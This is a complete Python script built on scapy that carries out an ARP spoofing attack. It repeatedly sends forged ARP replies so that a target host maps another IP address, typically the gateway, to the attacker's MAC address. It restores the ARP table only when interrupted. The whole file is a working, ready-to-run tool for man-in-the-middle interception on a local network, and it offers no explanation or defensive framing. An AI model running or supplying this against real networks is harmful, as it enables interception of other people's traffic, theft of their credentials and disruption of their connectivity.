# makoda
from scapy.all import ARP, Ether, srp, send
import sys
import time

def get_mac(ip):
    """
    Get the MAC address of a given IP.
    """
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
        for sent, received in ans:
            return received.hwsrc
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)

def spoof(target_ip, spoof_ip):
    """
    Send an ARP reply to the target, associating the spoof_ip with our MAC.
    """
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"Could not find MAC address for {target_ip}. Exiting.")
        sys.exit(1)

    # Construct the ARP response
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(arp_response, verbose=False)

def restore(target_ip, spoof_ip):
    """
    Restore the ARP table of the target by sending the correct ARP reply.
    """
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    if not target_mac or not spoof_mac:
        print("Could not restore ARP table. Exiting.")
        sys.exit(1)

    # Send the correct ARP response
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    send(arp_response, count=4, verbose=False)

def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <target_ip> <spoof_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    spoof_ip = sys.argv[2]

    print(f"Starting ARP spoofing attack on {target_ip}, pretending to be {spoof_ip}.")
    try:
        while True:
            spoof(target_ip, spoof_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nRestoring ARP tables...")
        restore(target_ip, spoof_ip)
        print("Exiting.")

if __name__ == "__main__":
    main()
